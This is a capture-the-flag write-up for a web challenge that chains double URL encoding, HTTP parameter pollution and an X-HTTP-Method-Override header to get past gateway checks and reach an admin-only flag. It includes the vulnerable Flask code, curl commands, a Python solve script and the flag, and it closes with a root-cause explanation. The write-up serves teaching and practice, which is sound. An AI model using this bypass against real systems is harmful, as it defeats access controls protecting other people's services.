# Soul Split — The Third Guardian (Web, Expert)

**Author:** Pratik Jadhav  
**Category:** Web / Parser Differential  
**Difficulty:** Expert  

## Challenge Description

> Every soul has three guardians. Each guardian believes it understands the same request. It doesn't.  
> Investigate how multiple request-processing layers interpret the same transfer differently to awaken the Third Guardian.

**Given:** A multi-layered web service with endpoints at `/`, `/soul/transfer`, and `/soul/fragment`.  
**Target URL:** `https://byteme-soul-split.onrender.com/` (or local `http://127.0.0.1:5000/`)  
**Flag Format:** `OWASP{...}` (or `FLAG{...}`)

## Summary

Soul Split is an architecture-level web exploitation challenge centered around **Parser Differentials** and **HTTP Parameter Pollution (HPP)** across multi-tier application architectures. A single HTTP POST request is evaluated by three independent layers: a Gateway Guardian, a Validator Guardian, and a Legacy Backend Application. The Gateway and Validator perform a single URL decode and inspect the first occurrence of the `recipient` parameter (expecting `guest`), while requiring an `X-HTTP-Method-Override: PATCH` header. The Legacy Application decodes the body a second time and reads the final occurrence of `recipient` (expecting `admin`). By exploiting double URL encoding (`recipient%253Dadmin`), we hide an injected administrative parameter inside what appears to the front-line proxies as an inert parameter name, successfully triggering backend privilege elevation and releasing the flag.

## Flag

```
OWASP{s0ul_spl1t_th3_th1rd_guardian}
```

*(Local environment default: `FLAG{s0ul_spl1t_th3_th1rd_guardian}`)*

---

## Step 1 — Application Reconnaissance

Visiting the landing page (`/`) introduces the lore of the Three Guardians and the Soul Vault:

![Soul Split Landing Page](resources/soul_split_landing.png)

Navigating to `/soul/fragment` while unauthenticated renders a locked error page (`locked.html` with HTTP 403 Forbidden).

The application exposes the following endpoints:
- `GET /` — Status page showing whether the Third Guardian is awakened.
- `GET /soul/history` — Transfer ledger history.
- `GET /soul/verify` — Guardian validation status.
- `POST /soul/transfer` — Main transfer gateway.
- `GET /soul/fragment` — Protected vault storage containing the flag.

Attempting a standard transfer via `POST /soul/transfer` with `recipient=admin&amount=100` immediately yields HTTP 403 Forbidden with a `rejected.html` page:
> *"The Guardians reject this transmission."*

## Step 2 — Source Code Audit (`app.py`)

Inspecting the implementation of `/soul/transfer` reveals how requests are processed through three distinct simulated layers:

```python
@app.post('/soul/transfer')
def transfer():
    # Guardian 1: Gateway checks raw body after exactly one URL decode.
    raw = request.get_data(as_text=True)
    once = unquote(raw)
    first = parse_qs(once, keep_blank_values=True)
    recipients = first.get('recipient', [])
    recipient_seen = recipients[0] if recipients else ''

    # Guardian 2: Validator only accepts PATCH override and sees first recipient.
    override = request.headers.get('X-HTTP-Method-Override', '').upper()
    if override != 'PATCH' or recipient_seen.lower() != 'guest':
        return render_template('rejected.html'), 403

    # Legacy application: Method override is honored; body decoded a second time.
    if override == 'PATCH':
        twice = unquote(once)
        final = parse_qs(twice, keep_blank_values=True)
        final_recipients = final.get('recipient', [])
        final_recipient = final_recipients[-1].lower() if final_recipients else ''
        amount = final.get('amount', ['0'])[-1]

        if final_recipient == 'admin' and amount == '100':
            session['awakened'] = True
            session['guardian'] = 'third'
            return redirect('/soul/fragment')

    return render_template('rejected.html'), 403
```

And `/soul/fragment`:
```python
@app.get('/soul/fragment')
def fragment():
    if not session.get('awakened'):
        return render_template('locked.html'), 403
    return render_template('fragment.html', flag=FLAG)
```

## Step 3 — Dissecting the Parser Differential

Let us analyze the conflicting requirements imposed across the layers:

| Layer | Component | Decodes | Parameter Selection | Required Value | Additional Checks |
|---|---|---|---|---|---|
| **Layer 1** | Gateway Guardian | 1 time | `first['recipient'][0]` (First value) | Must exist | None |
| **Layer 2** | Validator Guardian | 0 (uses Layer 1) | `recipient_seen` | Must be `'guest'` | `X-HTTP-Method-Override: PATCH` |
| **Layer 3** | Legacy Application | 2 times | `final['recipient'][-1]` (Last value) | Must be `'admin'` | `amount == '100'` |

### The Paradox:
- To satisfy Guardian 2, the **first** recipient must be `guest`.
- To satisfy the Legacy Application, the **last** recipient must be `admin`.
- But if we simply send `recipient=guest&recipient=admin`, both layers would see `admin` as the second recipient, and many web application firewalls or validators would flag the duplicate parameter or reject the mismatched state.
- Crucially, the Legacy Application performs a **second URL decode** (`unquote(once)`), whereas Guardian 1 and 2 only decode **once**.

### Crafting the Injection via Double URL Encoding:
We want an assignment (`recipient=admin`) to be completely invisible to Guardian 1/2's query string parser, but become an active parameter after the second decoding pass in Layer 3.

Consider the character `=`:
- Standard URL encoding of `=`: `%3D`
- Double URL encoding of `=`: `%253D` (since `%` is `%25`)

Let our raw request body be:
```
recipient=guest&recipient%253Dadmin&amount=100
```

#### First Pass (Gateway Guardian):
1. `once = unquote(raw)`:
   - `recipient%253Dadmin` decodes to `recipient%3Dadmin`
   - Resulting string: `recipient=guest&recipient%3Dadmin&amount=100`
2. `first = parse_qs(once)`:
   - Parameter 1: `recipient` -> `['guest']`
   - Parameter 2: `recipient%3Dadmin` -> `['']` (treated as a standalone key with no value, because `%3D` is literal and not an `=` delimiter!)
   - Parameter 3: `amount` -> `['100']`
3. Check `recipient_seen`:
   - `first.get('recipient')[0]` evaluates to `'guest'`.
4. Check `X-HTTP-Method-Override`:
   - With header `X-HTTP-Method-Override: PATCH`, Guardian 2 passes with flying colors!

#### Second Pass (Legacy Application):
1. `twice = unquote(once)`:
   - `recipient%3Dadmin` decodes to `recipient=admin`!
   - Resulting string: `recipient=guest&recipient=admin&amount=100`
2. `final = parse_qs(twice)`:
   - The `%3D` has now morphed into a genuine `=` key-value delimiter!
   - Parameter `recipient`: `['guest', 'admin']`
   - Parameter `amount`: `['100']`
3. Parameter precedence check:
   - `final_recipients[-1]` selects the **last** element: `'admin'`!
   - `amount` evaluates to `'100'`.
4. Verification:
   - `final_recipient == 'admin'` and `amount == '100'` is `True`!
   - The server sets `session['awakened'] = True` and issues a redirect to `/soul/fragment`.

## Step 4 — Execution & Verification

We can execute the exploit cleanly with `curl`:

```bash
# 1. Send the crafted PATCH override request with cookie jar preservation
curl -i -c cookies.txt -X POST https://byteme-soul-split.onrender.com/soul/transfer \
     -H "X-HTTP-Method-Override: PATCH" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "recipient=guest&recipient%253Dadmin&amount=100"
```

### HTTP Response:
```http
HTTP/2 302 
location: /soul/fragment
set-cookie: session=eyJhd2FrZW5lZCI6dHJ1ZSwiZ3VhcmRpYW4iOiJ0aGlyZCJ9...; HttpOnly; Path=/
content-type: text/html; charset=utf-8
```

The server accepted the transfer and set `session['awakened'] = True`!

```bash
# 2. Access the protected fragment route using the received session cookie
curl -i -b cookies.txt https://byteme-soul-split.onrender.com/soul/fragment
```

### Response Body:
```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>The Third Guardian Awakened</title>
</head>
<body>
  <h1>Guardian Awakened</h1>
  <p class="flag">OWASP{s0ul_spl1t_th3_th1rd_guardian}</p>
</body>
</html>
```

## Step 5 — Automated Exploit Script

For reproducible automated exploitation, we provide `solve_split.py`:

```python
import requests

BASE_URL = "https://byteme-soul-split.onrender.com"
# Local: BASE_URL = "http://127.0.0.1:5000"

def solve():
    session = requests.Session()

    headers = {
        "X-HTTP-Method-Override": "PATCH",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = "recipient=guest&recipient%253Dadmin&amount=100"

    print(f"[*] Dispatching split-parser payload to {BASE_URL}/soul/transfer...")
    res = session.post(f"{BASE_URL}/soul/transfer", data=payload, headers=headers, allow_redirects=False)

    print(f"[*] Response Status: {res.status_code}")
    print(f"[*] Redirect Location: {res.headers.get('Location')}")

    if res.status_code == 302 and res.headers.get("Location") == "/soul/fragment":
        print("[+] Session awakened! Fetching flag from /soul/fragment...")
        frag_res = session.get(f"{BASE_URL}/soul/fragment")
        if "OWASP{" in frag_res.text or "FLAG{" in frag_res.text:
            print("[🏆] Flag retrieved successfully!")
            for line in frag_res.text.splitlines():
                if "{" in line and "}" in line:
                    print(f"    {line.strip()}")
            return True
    else:
        print("[-] Exploit rejected.")
        return False

if __name__ == "__main__":
    solve()
```

## Solution Summary

| Parameter | Value |
|---|---|
| Target Endpoint | `POST /soul/transfer` |
| Method Override Header | `X-HTTP-Method-Override: PATCH` |
| Injected Payload | `recipient=guest&recipient%253Dadmin&amount=100` |
| Gateway View | `recipient=guest`, `recipient%3Dadmin=` |
| Backend View | `recipient=guest`, `recipient=admin`, `amount=100` |
| Flag | `OWASP{s0ul_spl1t_th3_th1rd_guardian}` |

## Root Cause & Vulnerability Explanation

1. **Inconsistent Request Normalization:** Each hop or abstraction layer in a web application pipeline must share the exact same canonicalization logic. In this challenge, the Gateway decoded once while the application layer decoded twice. This discrepancy allowed percent-encoded delimiters to pass uninspected through security controls before being interpreted by backend logic.
2. **HTTP Parameter Pollution (HPP):** When multiple values for the same parameter key are supplied, different frameworks handle them inconsistently (e.g., PHP takes the last value, ASP.NET concatenates with a comma, Python's `parse_qs` returns a list). The legacy application taking `recipients[-1]` directly enabled parameter precedence hijacking.
3. **Improper Method Overriding:** Trusting client-supplied method override headers like `X-HTTP-Method-Override` without enforcing strict route-level access control allows attackers to reach unvalidated legacy code paths.

## Tools Used

- **cURL** — Crafting precise raw HTTP requests with custom headers and cookie management.
- **Python Requests** — Automated verification script.
- **Burp Suite Repeater** — Interactive header manipulation and encoding experimentation.

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | Reconnaissance of `/soul/transfer` & `/soul/fragment` | Discovered locked flag endpoint and transfer rejection |
| 2 | Code analysis of `transfer()` | Identified 3-tier validation (Gateway, Validator, Legacy App) |
| 3 | Parser differential identification | Noticed double URL decoding and first vs. last parameter selection |
| 4 | Exploit construction | Encoded `=` delimiter as `%253D` with `X-HTTP-Method-Override: PATCH` |
| 5 | Request dispatch | Bypassed Gateway/Validator, triggered backend admin check, received flag |
